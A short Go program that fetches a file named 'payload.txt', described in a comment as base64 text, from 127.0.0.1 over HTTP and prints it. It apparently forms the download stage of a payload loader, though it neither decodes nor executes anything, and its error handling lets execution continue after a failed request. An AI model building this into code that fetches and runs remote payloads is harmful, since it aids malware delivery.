package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func chekerror(e error) {
	if e != nil {
		fmt.Println(e)
	}
}
func Download_error(datos string) string {
	link, err := http.Get(datos)
	chekerror(err)
	reqBody, err := ioutil.ReadAll(link.Body)
	chekerror(err)
	return (string(reqBody))
}

func main() {
	url := Download_error("http://127.0.0.1/payload.txt") //base64的txt
	fmt.Println(url)

}
